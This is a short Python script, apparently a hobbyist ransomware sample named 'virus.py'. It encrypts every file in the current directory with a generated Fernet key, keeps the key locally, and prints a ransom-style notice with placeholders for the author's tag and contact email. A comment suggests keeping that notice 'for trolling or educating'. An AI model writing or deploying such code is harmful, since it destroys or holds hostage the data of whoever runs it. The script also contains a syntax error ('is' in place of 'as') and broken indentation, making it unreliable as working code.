#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet


files = []

for file in os.listdir():
    if file == "virus.py" or file == "thekey.key" or file == "decrypt.py" or file == "README.txt":
        continue
    if os.path.isfile(file):
            files.append(file)
key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") is thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)





print("All of your files have been encrypted by (your name or tag here) -- for more info mail '(your bussiness email here)'") #everything past the -- is optional but i recommend (for trolling or educating) leaving that in. the stuff behind the -- can be romoved if you dont want them to contact you or you have your own ideas
